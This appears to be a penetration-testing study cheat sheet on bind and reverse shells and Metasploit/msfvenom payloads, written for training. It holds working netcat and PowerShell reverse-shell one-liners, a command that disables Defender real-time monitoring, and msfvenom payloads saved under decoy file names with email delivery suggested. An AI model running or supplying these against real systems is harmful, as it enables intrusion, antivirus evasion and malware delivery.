# 🐚 Shells & Payloads  
*Delve into the forbidden arts of initial compromise, where whispers in the void become footholds in vulnerable hosts. This module equips the practitioner with eldritch techniques to summon shells and craft payloads—essential rites in breaching the veil between attacker and target, be they Windows or Linux systems.*

> *“To speak with the machine, one must first teach it to listen.”*

<details>
<summary><h1>📌 Shell Basics</h1></summary>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏩ Bind Shells</h2></summary>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
nc -lvnp <PORT>
```

**Attack Machine: Connecting to target**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

</details>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Establishing a Basic Bind Shell with Netcat</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PORT> > /tmp/f
```  

**Attack Machine: Starting Netcat listener**  

```bash
nc -nv <IP> <PORT>
```

> **Note:** Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.

</details>

</details>

&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>⏪ Reverse Shells</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Basic Reverse Shell with Netcat</h3></summary>  

**Attack Machine: Starting a listener**  

```bash
sudo nc -lvnp <PORT>
```

**Target Machine(Windows - CMD): Connect to the Attack Machine**  
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you get an error like this one:  
```cmd
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Disable the antivirus using Powershell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Re-run the CMD command.

</details>
</details>


</details>

<details>
<summary><h1>📦 Payloads</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Metasploit - Example</h3></summary>  

```bash
sudo msfconsole
```

**Inside the MSF Console**  

Searching Within Metasploit  

```bash
search smb
```

Selecting an Exploit  

```bash
use 56
```

Examining an Exploit's Options  

```bash
options
```

Setting Options  

```bash
set RHOSTS <TARGET IP>
set SMBUser <USER>
set SMBPass <PASSWORD>
set LHOST <ATTACKER IP>
set LPORT <ATTACKER PORT>
set PAYLOAD windows/meterpreter/reverse_tcp
```

Exploits Away  

```bash
run

# [*] Meterpreter session 1 opened (<ATTACKER IP>:<ATTACKER PORT> -> <TARGET IP>:<TARGET PORT>) at 2025-06-20 10:56:44 -0500

# (Meterpreter 1)(C:\Windows\system32) > 
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Crafting payloads with MSFvenom</h3></summary>  

**Attack Machine: List Payloads** 

```bash
msfvenom -l payloads
```

**Attack Machine: Building A Stageless Payload** 
  
```bash
msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f <FILE FORMAT> > <OUTPUT FILE>
```

Examples:  

> **Linux:** msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

> **Windows:** msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > GTA_SA.exe  

**Target Machine: Download and execute** 

There are countless ways this can be done. Here are just some of the common ways:

> Email message with the file attached.  

> Download link on a website.  

> Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).  

> Via flash drive as part of an onsite penetration test.  

The payload in this form would almost certainly be detected by Windows Defender AV.


</details>
</details>


<details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<summary><h1>🪟 Windows Shells</h1></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Infiltrating Windows</h3></summary>  

**Target Machine: Starting Netcat listener**  

```bash
nc -lvnp <PORT>
```

</details>


</details>